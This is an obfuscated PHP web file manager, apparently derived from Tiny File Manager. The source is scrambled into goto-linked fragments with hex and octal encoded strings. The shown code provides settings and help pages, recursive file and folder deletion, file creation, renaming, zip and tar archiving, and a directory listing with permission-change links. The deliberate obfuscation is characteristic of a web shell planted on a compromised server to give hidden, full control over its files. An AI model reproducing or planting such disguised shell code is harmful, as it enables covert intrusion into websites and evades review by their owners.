<?php
 goto iOIE1; zDw8x: function rf_isvalid_filename($text) { return strpbrk($text, "\57\77\45\x2a\x3a\174\42\x3c\x3e") === FALSE ? true : false; } goto stgU4; Ll7tk: ?>
</th>
                <?php  goto kBPTY; nFwi6: define("\162\146\137\105\x44\111\124\137\x46\x49\x4c\x45", $edit_files); goto XNon1; aupHX: if ($use_auth && isset($_SESSION[rf_SESSION_ID]["\x6c\157\x67\x67\x65\144"])) { $root_path = isset($directories_users[$_SESSION[rf_SESSION_ID]["\x6c\157\x67\147\x65\x64"]]) ? $directories_users[$_SESSION[rf_SESSION_ID]["\154\x6f\x67\x67\x65\x64"]] : $root_path; } goto V_CO9; lQdv5: if (is_readable($config_file)) { @(include $config_file); } goto DqKlV; Y2b0P: function rf_mkdir($dir, $force) { if (file_exists($dir)) { if (is_dir($dir)) { return $dir; } elseif (!$force) { return false; } unlink($dir); } return mkdir($dir, 511, true); } goto S69mM; DZ6a0: defined("\162\x66\x5f\x55\123\x45\137\x48\111\107\x48\x4c\111\x47\110\x54\x4a\x53") || define("\162\146\137\125\123\x45\137\x48\x49\x47\110\x4c\111\x47\x48\x54\x4a\123", $use_highlightjs); goto IK6f5; ZzTqY: $use_highlightjs = true; goto Z2gdz; DCQrg: if (isset($_GET["\163\145\x74\x74\x69\x6e\147\163"]) && !rf_READONLY) { rf_show_header(); rf_show_nav_path(rf_PATH); global $cfg, $lang, $lang_list; ?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php  echo rf_get_theme(); ?>
">
            <h6 class="card-header">
                <i class="fa fa-cog"></i>  <?php  echo lng("\123\x65\164\164\151\156\x67\x73"); ?>
                <a href="?p=<?php  echo rf_PATH; ?>
" class="float-right"><i class="fa fa-window-close"></i> <?php  echo lng("\103\141\x6e\x63\145\x6c"); ?>
</a>
            </h6>
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
                    <input type="hidden" name="type" value="settings" aria-label="hidden" aria-hidden="true">
                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label"><?php  echo lng("\x4c\x61\156\x67\x75\x61\147\145"); ?>
</label>
                        <div class="col-sm-5">
                            <select class="form-control" id="js-language" name="js-language">
                                <?php  function getSelected($l) { global $lang; return $lang == $l ? "\x73\145\154\x65\143\164\x65\144" : ''; } foreach ($lang_list as $k => $v) { echo "\x3c\x6f\x70\x74\151\x6f\156\x20\166\x61\154\x75\145\x3d\47{$k}\47\40" . getSelected($k) . "\x3e{$v}\74\57\x6f\160\x74\151\157\x6e\x3e"; } ?>
                            </select>
                        </div>
                    </div>
                    <?php  function getChecked($conf, $val, $txt) { if ($conf == 1 && $val == 1) { return $txt; } else { if ($conf == '' && $val == '') { return $txt; } else { return ''; } } } ?>
                    <div class="form-group row">
                        <label for="js-err-rpt-1" class="col-sm-3 col-form-label"><?php  echo lng("\105\x72\162\x6f\162\122\145\160\x6f\162\164\x69\156\x67"); ?>
</label>
                        <div class="col-sm-9">
                            <div class="btn-group btn-group-toggle" data-toggle="buttons">
                                <label class="btn btn-secondary <?php  echo getChecked($report_errors, 1, "\141\143\x74\x69\166\x65"); ?>
">
                                    <input type="radio" name="js-error-report" id="js-err-rpt-1" autocomplete="off" value="true" <?php  echo getChecked($report_errors, 1, "\143\150\x65\x63\x6b\145\x64"); ?>
 > ON
                                </label>
                                <label class="btn btn-secondary <?php  echo getChecked($report_errors, '', "\x61\143\164\151\166\x65"); ?>
">
                                    <input type="radio" name="js-error-report" id="js-err-rpt-0" autocomplete="off" value="false" <?php  echo getChecked($report_errors, '', "\x63\150\145\143\x6b\145\x64"); ?>
 > OFF
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label for="js-hdn-1" class="col-sm-3 col-form-label"><?php  echo lng("\123\x68\157\x77\x48\151\144\144\x65\x6e\106\x69\154\x65\163"); ?>
</label>
                        <div class="col-sm-9">
                            <div class="btn-group btn-group-toggle" data-toggle="buttons">
                                <label class="btn btn-secondary <?php  echo getChecked($show_hidden_files, 1, "\x61\143\164\151\166\x65"); ?>
">
                                    <input type="radio" name="js-show-hidden" id="js-hdn-1" autocomplete="off" value="true" <?php  echo getChecked($show_hidden_files, 1, "\143\150\145\143\153\x65\x64"); ?>
 > ON
                                </label>
                                <label class="btn btn-secondary <?php  echo getChecked($show_hidden_files, '', "\x61\143\164\151\x76\145"); ?>
">
                                    <input type="radio" name="js-show-hidden" id="js-hdn-0" autocomplete="off" value="false" <?php  echo getChecked($show_hidden_files, '', "\x63\x68\x65\143\x6b\145\144"); ?>
 > OFF
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label for="js-hid-1" class="col-sm-3 col-form-label"><?php  echo lng("\110\151\144\145\103\x6f\154\165\155\x6e\x73"); ?>
</label>
                        <div class="col-sm-9">
                            <div class="btn-group btn-group-toggle" data-toggle="buttons">
                                <label class="btn btn-secondary <?php  echo getChecked($hide_cols, 1, "\141\143\x74\151\166\x65"); ?>
">
                                    <input type="radio" name="js-hide-cols" id="js-hid-1" autocomplete="off" value="true" <?php  echo getChecked($hide_cols, 1, "\143\x68\145\143\x6b\145\x64"); ?>
 > ON
                                </label>
                                <label class="btn btn-secondary <?php  echo getChecked($hide_cols, '', "\x61\x63\164\x69\x76\145"); ?>
">
                                    <input type="radio" name="js-hide-cols" id="js-hid-0" autocomplete="off" value="false" <?php  echo getChecked($hide_cols, '', "\x63\x68\145\143\153\x65\x64"); ?>
 > OFF
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label for="js-dir-1" class="col-sm-3 col-form-label"><?php  echo lng("\x43\141\x6c\143\x75\154\x61\x74\x65\106\x6f\x6c\x64\x65\162\123\x69\172\145"); ?>
</label>
                        <div class="col-sm-9">
                            <div class="btn-group btn-group-toggle" data-toggle="buttons">
                                <label class="btn btn-secondary <?php  echo getChecked($calc_folder, 1, "\x61\143\x74\x69\166\145"); ?>
">
                                    <input type="radio" name="js-calc-folder" id="js-dir-1" autocomplete="off" value="true" <?php  echo getChecked($calc_folder, 1, "\x63\x68\145\x63\153\145\144"); ?>
 > ON
                                </label>
                                <label class="btn btn-secondary <?php  echo getChecked($calc_folder, '', "\141\143\164\x69\166\145"); ?>
">
                                    <input type="radio" name="js-calc-folder" id="js-dir-0" autocomplete="off" value="false" <?php  echo getChecked($calc_folder, '', "\143\150\145\143\153\145\144"); ?>
 > OFF
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <div class="col-sm-10">
                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> <?php  echo lng("\x53\x61\x76\145"); ?>
</button>
                        </div>
                    </div>

                </form>
            </div>
        </div>
    </div>
    <?php  rf_show_footer(); die; } goto VzbO1; b5sb0: defined("\x72\x66\137\x44\x4f\103\137\x56\111\x45\x57\105\x52") || define("\162\146\137\x44\x4f\103\x5f\126\x49\x45\127\x45\122", $online_viewer); goto GznSZ; kBPTY: if (!rf_IS_WIN && !$hide_cols) { ?>
                    <th><?php  echo lng("\120\x65\162\155\x73"); ?>
</th>
                    <th><?php  echo lng("\117\167\156\145\162"); ?>
</th><?php  } goto O7_M8; nQGAk: $CONFIG = "\173\42\x6c\x61\x6e\147\x22\x3a\42\x65\156\x22\x2c\x22\x65\162\x72\157\162\137\162\x65\160\157\162\x74\151\156\x67\x22\x3a\x66\141\x6c\163\145\x2c\x22\163\x68\157\x77\x5f\x68\151\x64\x64\145\156\42\x3a\164\x72\x75\x65\54\x22\150\x69\144\145\x5f\x63\157\154\x73\x22\72\x66\141\154\x73\x65\x2c\x22\143\x61\154\x63\137\x66\x6f\154\144\145\x72\42\72\x66\x61\x6c\x73\145\175"; goto ft6uH; Pw36n: if (is_array($objects) && rf_is_exclude_items($current_path)) { foreach ($objects as $file) { if ($file == "\56" || $file == "\56\56") { continue; } if (!rf_SHOW_HIDDEN && substr($file, 0, 1) === "\56") { continue; } $new_path = $path . "\57" . $file; if (@is_file($new_path) && rf_is_exclude_items($file)) { $files[] = $file; } elseif (@is_dir($new_path) && $file != "\56" && $file != "\x2e\x2e" && rf_is_exclude_items($file)) { $folders[] = $file; } } } goto a0sHu; VzbO1: if (isset($_GET["\150\145\x6c\160"])) { rf_show_header(); rf_show_nav_path(rf_PATH); global $cfg, $lang; ?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php  echo rf_get_theme(); ?>
">
            <h6 class="card-header">
                <i class="fa fa-exclamation-circle"></i> <?php  echo lng("\x48\145\154\160"); ?>
                <a href="?p=<?php  echo rf_PATH; ?>
" class="float-right"><i class="fa fa-window-close"></i> <?php  echo lng("\103\x61\x6e\x63\145\x6c"); ?>
</a>
            </h6>
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="javascript:latest_release_info('<?php  echo VERSION; ?>
');"><i class="fa fa-link"> </i> <?php  echo lng("\x43\x68\x65\x63\153\x20\x4c\141\164\x65\x73\x74\x20\x56\x65\162\x73\151\x6f\x6e"); ?>
</a></li>
                                <?php  if (!rf_READONLY) { ?>
                                <li class="list-group-item"><a href="javascript:show_new_pwd();"><i class="fa fa-lock"></i> <?php  echo lng("\x47\x65\x6e\145\162\x61\x74\145\40\156\145\167\40\160\x61\163\163\167\x6f\162\144\x20\150\141\x73\x68"); ?>
</a></li>
                                <?php  } ?>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row js-new-pwd hidden mt-2">
                    <div class="col-12">
                        <form class="form-inline" onsubmit="return new_password_hash(this)" method="POST" action="">
                            <input type="hidden" name="type" value="pwdhash" aria-label="hidden" aria-hidden="true">
                            <div class="form-group mb-2">
                                <label for="staticEmail2"><?php  echo lng("\107\x65\x6e\145\x72\x61\164\x65\40\156\x65\167\x20\160\141\163\163\167\x6f\x72\x64\40\x68\x61\163\x68"); ?>
</label>
                            </div>
                            <div class="form-group mx-sm-3 mb-2">
                                <label for="inputPassword2" class="sr-only"><?php  echo lng("\120\141\x73\163\167\157\x72\x64"); ?>
</label>
                                <input type="text" class="form-control btn-sm" id="inputPassword2" name="inputPassword2" placeholder="Password" required>
                            </div>
                            <button type="submit" class="btn btn-success btn-sm mb-2"><?php  echo lng("\x47\x65\156\145\162\141\164\x65"); ?>
</button>
                        </form>
                        <textarea class="form-control" rows="2" readonly id="js-pwd-result"></textarea>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php  rf_show_footer(); die; } goto xK9nI; RiV6t: function rf_rdelete($path) { if (is_link($path)) { return unlink($path); } elseif (is_dir($path)) { $objects = scandir($path); $ok = true; if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\56" && $file != "\x2e\56") { if (!rf_rdelete($path . "\57" . $file)) { $ok = false; } } } } return $ok ? rmdir($path) : false; } elseif (is_file($path)) { return unlink($path); } return false; } goto uc3cK; ia8nF: class rf_Zipper_Tar { private $tar; public function __construct() { $this->tar = null; } public function create($filename, $files) { $this->tar = new PharData($filename); if (is_array($files)) { foreach ($files as $f) { if (!$this->addFileOrDir($f)) { return false; } } return true; } else { if ($this->addFileOrDir($files)) { return true; } return false; } } public function unzip($filename, $path) { $res = $this->tar->open($filename); if ($res !== true) { return false; } if ($this->tar->extractTo($path)) { return true; } return false; } private function addFileOrDir($filename) { if (is_file($filename)) { try { $this->tar->addFile($filename); return true; } catch (Exception $e) { return false; } } elseif (is_dir($filename)) { return $this->addDir($filename); } return false; } private function addDir($path) { $objects = scandir($path); if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\56" && $file != "\x2e\x2e") { if (is_dir($path . "\57" . $file)) { if (!$this->addDir($path . "\57" . $file)) { return false; } } elseif (is_file($path . "\x2f" . $file)) { try { $this->tar->addFile($path . "\x2f" . $file); } catch (Exception $e) { return false; } } } } return true; } return false; } } goto Ryxeb; Faws0: $allowed_file_extensions = ''; goto EAjxM; a0sHu: if (!empty($files)) { natcasesort($files); } goto aUQgm; YfqYI: function rf_clean_path($path, $trim = true) { $path = $trim ? trim($path) : $path; $path = trim($path, "\134\57"); $path = str_replace(array("\56\x2e\57", "\x2e\x2e\134"), '', $path); $path = get_absolute_path($path); if ($path == "\x2e\x2e") { $path = ''; } return str_replace("\x5c", "\57", $path); } goto HBKAc; RHjc9: if (!isset($_GET["\160"]) && empty($_FILES)) { rf_redirect(rf_SELF_URL . "\x3f\x70\x3d"); } goto fOum0; yq2pk: $report_errors = isset($cfg->data["\145\x72\162\x6f\x72\137\x72\x65\x70\157\x72\x74\151\x6e\147"]) ? $cfg->data["\x65\x72\x72\x6f\162\137\x72\x65\160\157\x72\x74\x69\x6e\147"] : true; goto Mx4kJ; CnIho: function rf_get_theme() { $result = ''; if (rf_THEME == "\144\141\x72\153") { $result = "\x74\145\x78\x74\55\167\150\151\164\x65\40\142\147\x2d\x64\x61\162\153"; } return $result; } goto bXP5z; BnhBk: $iconv_input_encoding = "\125\x54\x46\55\x38"; goto W5OMG; ezGvU: function rf_show_nav_path($path) { global $lang, $sticky_navbar; $isStickyNavBar = $sticky_navbar ? "\x66\x69\x78\x65\x64\55\x74\x6f\160" : ''; $getTheme = rf_get_theme(); $getTheme .= "\40\x6e\141\x76\142\141\162\55\154\151\x67\x68\164"; if (rf_THEME == "\144\x61\x72\153") { $getTheme .= "\40\156\141\x76\x62\x61\162\55\x64\x61\162\x6b"; } else { $getTheme .= "\40\142\x67\x2d\167\x68\x69\164\x65"; } ?>
    <nav class="navbar navbar-expand-lg <?php  echo $getTheme; ?>
 mb-4 main-nav <?php  echo $isStickyNavBar; ?>
">
        <a class="navbar-brand" href=""> <?php  echo lng("\101\160\x70\124\x69\164\x6c\x65"); ?>
 </a>
        <button style="padding: 2px 6px" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

            <?php  $path = rf_clean_path($path); $root_url = "\74\141\40\x68\x72\145\x66\75\x27\x3f\x70\x3d\x27\76\74\x69\x20\143\x6c\141\163\163\x3d\x27\146\141\40\x66\x61\x2d\x68\157\155\x65\47\40\x61\162\x69\x61\x2d\150\x69\x64\x64\x65\x6e\x3d\x27\164\x72\x75\x65\x27\40\x74\151\x74\x6c\145\x3d\x27" . rf_ROOT_PATH . "\47\x3e\74\x2f\x69\76\74\x2f\141\x3e"; $sep = "\x3c\151\x20\x63\x6c\x61\163\163\75\42\142\162\x65\141\144\x2d\143\162\x75\x6d\142\x22\76\x20\x2f\40\74\57\151\76"; if ($path != '') { $exploded = explode("\x2f", $path); $count = count($exploded); $array = array(); $parent = ''; for ($i = 0; $i < $count; $i++) { $parent = trim($parent . "\x2f" . $exploded[$i], "\x2f"); $parent_enc = urlencode($parent); $array[] = "\x3c\x61\x20\150\x72\x65\x66\75\47\x3f\x70\75{$parent_enc}\47\x3e" . rf_enc(rf_convert_win($exploded[$i])) . "\x3c\x2f\x61\76"; } $root_url .= $sep . implode($sep, $array); } echo "\74\144\x69\166\40\x63\x6c\x61\x73\163\x3d\x22\x63\157\154\x2d\x78\x73\x2d\x36\40\143\157\154\55\163\155\55\65\x22\x3e" . $root_url . "\x3c\x2f\144\x69\x76\x3e"; ?>

            <div style="padding: 0" class="col-xs-6 col-sm-7 text-right">
                <ul class="navbar-nav mr-auto float-right <?php  echo rf_get_theme(); ?>
">
                    <li class="nav-item">
                    <div class="input-group input-group-sm" style="margin: 4px 0;">
                            <input style= "padding: 14px 8px" type="text" class="form-control" placeholder="<?php  echo lng("\123\x65\x61\x72\143\150"); ?>
" aria-label="<?php  echo lng("\123\145\141\162\143\x68"); ?>
" aria-describedby="search-addon2" id="search-addon">
                            <div class="input-group-append">
                                <span class="input-group-text" id="search-addon2"><i class="fa fa-search"></i></span>
                            </div>
                            <div class="input-group-append btn-group">
                            <span style= "padding: 0 6px" class="input-group-text dropdown-toggle" id="search-addon2" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
                                <div style="margin: 0; padding: 0" class="dropdown-menu dropdown-menu-right">
                                    <small><a class="dropdown-item" href="<?php  echo $path2 = $path ? $path : "\x2e"; ?>
" id="js-search-modal" data-toggle="modal" data-target="#searchModal"><i style="font-size: 14px" class="fa fa-search-plus">&nbsp;</i>Advanced Search</a></small>
                                </div>
                            </div>
                        </div>
                    </li>
                    <?php  if (!rf_READONLY) { ?>
                    <li class="nav-item">
                        <a title="<?php  echo lng("\125\160\x6c\x6f\x61\144"); ?>
" class="nav-link" href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php  echo lng("\125\x70\154\157\141\x64"); ?>
</a>
                    </li>
                    <li class="nav-item">
                        <a title="<?php  echo lng("\116\x65\x77\111\x74\145\x6d"); ?>
" class="nav-link" href="#createNewItem" data-toggle="modal" data-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php  echo lng("\116\145\x77\x49\x74\145\155"); ?>
</a>
                    </li>
                    <?php  } ?>
                    <?php  if (rf_USE_AUTH) { ?>
                    <li class="nav-item avatar dropdown">
                        <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="fa fa-user-circle"></i> <?php  if (isset($_SESSION[rf_SESSION_ID]["\x6c\157\x67\147\x65\x64"])) { echo $_SESSION[rf_SESSION_ID]["\154\x6f\147\x67\x65\144"]; } ?>
</a>
                        <div style="margin-bottom: 8px; padding: 0 8px" class="dropdown-menu dropdown-menu-right <?php  echo rf_get_theme(); ?>
" aria-labelledby="navbarDropdownMenuLink-5">
                            <?php  if (!rf_READONLY) { ?>
                            <a title="<?php  echo lng("\x53\x65\164\164\151\x6e\147\163"); ?>
" class="dropdown-item nav-link" href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php  echo lng("\123\x65\164\x74\151\x6e\147\x73"); ?>
</a>
                            <?php  } ?>
                            <a title="<?php  echo lng("\x48\x65\x6c\160"); ?>
" class="dropdown-item nav-link" href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php  echo lng("\110\145\154\160"); ?>
</a>
                            <a title="<?php  echo lng("\x4c\157\147\x6f\x75\x74"); ?>
" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php  echo lng("\x4c\x6f\147\x6f\165\164"); ?>
</a>
                        </div>
                    </li>
                    <?php  } else { ?>
                        <?php  if (!rf_READONLY) { ?>
                            <li class="nav-item">
                                <a title="<?php  echo lng("\x53\145\164\164\151\156\147\163"); ?>
" class="dropdown-item nav-link" href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php  echo lng("\123\145\164\x74\151\156\x67\163"); ?>
</a>
                            </li>
                        <?php  } ?>
                    <?php  } ?>
                </ul>
            </div>
        </div>
    </nav>
    <?php  } goto AbCQd; s2nb1: $root_path = str_replace("\134", "\57", $root_path); goto YtYWn; bXP5z: class rf_Zipper { private $zip; public function __construct() { $this->zip = new ZipArchive(); } public function create($filename, $files) { $res = $this->zip->open($filename, ZipArchive::CREATE); if ($res !== true) { return false; } if (is_array($files)) { foreach ($files as $f) { if (!$this->addFileOrDir($f)) { $this->zip->close(); return false; } } $this->zip->close(); return true; } else { if ($this->addFileOrDir($files)) { $this->zip->close(); return true; } return false; } } public function unzip($filename, $path) { $res = $this->zip->open($filename); if ($res !== true) { return false; } if ($this->zip->extractTo($path)) { $this->zip->close(); return true; } return false; } private function addFileOrDir($filename) { if (is_file($filename)) { return $this->zip->addFile($filename); } elseif (is_dir($filename)) { return $this->addDir($filename); } return false; } private function addDir($path) { if (!$this->zip->addEmptyDir($path)) { return false; } $objects = scandir($path); if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\56" && $file != "\x2e\56") { if (is_dir($path . "\x2f" . $file)) { if (!$this->addDir($path . "\57" . $file)) { return false; } } elseif (is_file($path . "\57" . $file)) { if (!$this->zip->addFile($path . "\57" . $file)) { return false; } } } } return true; } return false; } } goto ia8nF; AhFMo: function rf_get_translations($tr) { try { $content = @file_get_contents("\x74\x72\141\156\163\154\141\164\151\157\x6e\56\x6a\163\x6f\x6e"); if ($content !== FALSE) { $lng = json_decode($content, TRUE); global $lang_list; foreach ($lng["\x6c\141\x6e\x67\165\x61\147\x65"] as $key => $value) { $code = $value["\143\157\144\145"]; $lang_list[$code] = $value["\x6e\x61\155\145"]; if ($tr) { $tr[$code] = $value["\x74\162\x61\156\163\154\141\164\151\x6f\x6e"]; } } return $tr; } } catch (Exception $e) { echo $e; } } goto RYnju; yRyaa: $ip_ruleset = "\x4f\106\106"; goto a7JvZ; bJqaT: function rf_show_footer_login() { ?>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.slim.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
</body>
</html>
<?php  } goto WMr6u; B5Yn1: ?>
</th>
            </tr>
            </thead>
            <?php  goto wIvp6; c_rH0: if (isset($_GET["\x64\x65\x6c"]) && !rf_READONLY) { $del = str_replace("\x2f", '', rf_clean_path($_GET["\144\x65\x6c"])); if ($del != '' && $del != "\56\56" && $del != "\56") { $path = rf_ROOT_PATH; if (rf_PATH != '') { $path .= "\x2f" . rf_PATH; } $is_dir = is_dir($path . "\x2f" . $del); if (rf_rdelete($path . "\57" . $del)) { $msg = $is_dir ? "\106\x6f\x6c\x64\x65\162\40\x3c\x62\x3e\45\163\74\x2f\142\76\x20\144\145\154\145\164\145\x64" : "\x46\151\154\145\x20\74\x62\76\x25\163\x3c\57\x62\76\40\x64\145\x6c\145\x74\x65\x64"; rf_set_msg(sprintf($msg, rf_enc($del))); } else { $msg = $is_dir ? "\106\x6f\154\144\145\162\x20\74\x62\x3e\x25\163\x3c\x2f\142\x3e\x20\x6e\157\164\40\x64\x65\x6c\x65\x74\145\144" : "\106\x69\x6c\x65\40\74\142\76\45\163\x3c\x2f\142\76\x20\156\157\164\40\144\x65\154\x65\164\x65\144"; rf_set_msg(sprintf($msg, rf_enc($del)), "\x65\162\162\x6f\162"); } } else { rf_set_msg("\111\x6e\166\x61\154\x69\144\x20\146\x69\154\145\40\157\162\40\146\x6f\x6c\144\145\162\40\156\x61\x6d\x65", "\x65\162\162\x6f\162"); } rf_redirect(rf_SELF_URL . "\x3f\x70\75" . urlencode(rf_PATH)); } goto axZp9; axZp9: if (isset($_GET["\x6e\x65\167"]) && isset($_GET["\x74\x79\x70\x65"]) && !rf_READONLY) { $type = $_GET["\164\x79\160\x65"]; $new = str_replace("\x2f", '', rf_clean_path(strip_tags($_GET["\x6e\145\x77"]))); if (rf_isvalid_filename($new) && $new != '' && $new != "\x2e\56" && $new != "\x2e") { $path = rf_ROOT_PATH; if (rf_PATH != '') { $path .= "\57" . rf_PATH; } if ($_GET["\x74\x79\160\x65"] == "\146\x69\154\145") { if (!file_exists($path . "\x2f" . $new)) { if (rf_is_valid_ext($new)) { @fopen($path . "\57" . $new, "\x77") or die("\x43\x61\x6e\x6e\x6f\x74\x20\x6f\x70\x65\156\x20\146\151\154\145\x3a\40\40" . $new); rf_set_msg(sprintf(lng("\106\x69\x6c\x65") . "\x20\74\x62\76\x25\x73\74\57\x62\76\40" . lng("\103\x72\145\x61\164\145\x64"), rf_enc($new))); } else { rf_set_msg("\x46\x69\x6c\145\x20\x65\170\x74\x65\x6e\163\151\157\x6e\x20\x69\x73\x20\156\157\x74\x20\141\154\154\x6f\x77\x65\144", "\x65\162\x72\157\162"); } } else { rf_set_msg(sprintf("\x46\151\154\x65\40\74\142\76\x25\163\x3c\57\x62\x3e\40\141\154\x72\x65\x61\144\x79\40\x65\170\151\163\164\163", rf_enc($new)), "\141\x6c\145\162\164"); } } else { if (rf_mkdir($path . "\57" . $new, false) === true) { rf_set_msg(sprintf(lng("\106\157\x6c\144\x65\x72") . "\40\x3c\x62\76\45\163\74\57\142\76\40" . lng("\103\162\x65\141\x74\x65\144"), $new)); } elseif (rf_mkdir($path . "\57" . $new, false) === $path . "\x2f" . $new) { rf_set_msg(sprintf("\x46\x6f\x6c\144\x65\162\40\x3c\x62\76\45\163\x3c\x2f\x62\76\x20\x61\154\x72\145\x61\x64\x79\x20\x65\170\151\x73\x74\163", rf_enc($new)), "\141\154\145\162\x74"); } else { rf_set_msg(sprintf("\x46\x6f\x6c\x64\145\162\x20\74\x62\x3e\45\x73\74\x2f\x62\x3e\40\x6e\x6f\164\40\143\162\x65\x61\164\145\x64", rf_enc($new)), "\145\x72\162\157\162"); } } } else { rf_set_msg("\111\x6e\x76\141\x6c\151\x64\x20\x63\x68\141\162\141\x63\164\x65\x72\x73\x20\x69\156\40\x66\151\x6c\x65\x20\x6f\x72\x20\146\x6f\154\x64\x65\162\x20\x6e\x61\155\145", "\145\x72\x72\x6f\x72"); } rf_redirect(rf_SELF_URL . "\x3f\x70\x3d" . urlencode(rf_PATH)); } goto nJPLr; Xpd7Q: function rf_rename($old, $new) { $isFileAllowed = rf_is_valid_ext($new); if (!$isFileAllowed) { return false; } return !file_exists($new) && file_exists($old) ? rename($old, $new) : null; } goto Zm88u; Xwsbm: ?>

    <center><div style="font-size: 12px;margin: 6px 0"><a href="#" target="_blank" class="text-muted">File  <?php  goto z8DHn; WB4Nm: $theme = "\x6c\x69\147\150\x74"; goto nJoBw; Yx3p8: foreach ($folders as $f) { $is_link = is_link($path . "\x2f" . $f); $img = $is_link ? "\x69\143\x6f\156\x2d\154\x69\156\153\x5f\x66\157\154\144\x65\162" : "\146\x61\x20\146\141\x2d\146\x6f\154\144\x65\x72"; $modif_raw = filemtime($path . "\x2f" . $f); $modif = date(rf_DATETIME_FORMAT, $modif_raw); if ($calc_folder) { $filesize_raw = rf_get_directorysize($path . "\x2f" . $f); $filesize = rf_get_filesize($filesize_raw); } else { $filesize_raw = ''; $filesize = lng("\106\x6f\x6c\x64\145\162"); } $perms = substr(decoct(fileperms($path . "\57" . $f)), -4); if (function_exists("\x70\157\163\151\170\x5f\x67\145\x74\x70\167\x75\151\x64") && function_exists("\x70\x6f\163\151\170\x5f\147\145\164\x67\x72\x67\151\x64")) { $owner = posix_getpwuid(fileowner($path . "\57" . $f)); $group = posix_getgrgid(filegroup($path . "\57" . $f)); } else { $owner = array("\x6e\141\155\x65" => "\77"); $group = array("\156\141\155\x65" => "\x3f"); } ?>
                <tr>
                    <?php  if (!rf_READONLY) { ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php  echo $ii; ?>
" name="file[]" value="<?php  echo rf_enc($f); ?>
">
                            <label class="custom-control-label" for="<?php  echo $ii; ?>
"></label>
                        </div>
                        </td><?php  } ?>
                    <td>
                        <div class="filename"><a href="?p=<?php  echo urlencode(trim(rf_PATH . "\x2f" . $f, "\57")); ?>
"><i class="<?php  echo $img; ?>
"></i> <?php  echo rf_convert_win(rf_enc($f)); ?>
                            </a><?php  echo $is_link ? "\x20\46\x72\x61\162\x72\x3b\x20\x3c\x69\x3e" . readlink($path . "\x2f" . $f) . "\x3c\x2f\151\x3e" : ''; ?>
</div>
                    </td>
                    <td data-sort="a-<?php  echo str_pad($filesize_raw, 18, "\x30", STR_PAD_LEFT); ?>
">
                        <?php  echo $filesize; ?>
                    </td>
                    <td data-sort="a-<?php  echo $modif_raw; ?>
"><?php  echo $modif; ?>
</td>                                                                                                                           
                    <?php  if (!rf_IS_WIN && !$hide_cols) { ?>
                        <td><?php  if (!rf_READONLY) { ?>
<a title="Change Permissions" href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;chmod=<?php  echo urlencode($f); ?>
"><?php  echo $perms; ?>
</a><?php  } else { echo $perms; } ?>
                        </td>
                        <td><?php  echo $owner["\156\141\x6d\x65"] . "\72" . $group["\156\x61\155\145"]; ?>
</td>
                    <?php  } ?>
                    <td class="inline-actions"><?php  if (!rf_READONLY) { ?>
                            <a title="<?php  echo lng("\x44\x65\x6c\145\x74\145"); ?>
" href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;del=<?php  echo urlencode($f); ?>
" onclick="return confirm('<?php  echo lng("\104\x65\154\x65\x74\145") . "\40" . lng("\106\157\x6c\x64\x65\162") . "\77"; ?>
\n \n ( <?php  echo urlencode($f); ?>
 )');"> <i class="fa fa-trash-o" aria-hidden="true"></i></a>
                            <a title="<?php  echo lng("\x52\145\x6e\x61\155\145"); ?>
" href="#" onclick="rename('<?php  echo rf_enc(rf_PATH); ?>
', '<?php  echo rf_enc(addslashes($f)); ?>
');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
                            <a title="<?php  echo lng("\x43\157\160\x79\x54\x6f"); ?>
..." href="?p=&amp;copy=<?php  echo urlencode(trim(rf_PATH . "\x2f" . $f, "\57")); ?>
"><i class="fa fa-files-o" aria-hidden="true"></i></a>
                        <?php  } ?>
                        <a title="<?php  echo lng("\104\151\162\145\143\164\x4c\x69\x6e\153"); ?>
" href="<?php  echo rf_enc(rf_ROOT_URL . (rf_PATH != '' ? "\x2f" . rf_PATH : '') . "\57" . $f . "\x2f"); ?>
" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
                    </td>
                </tr>
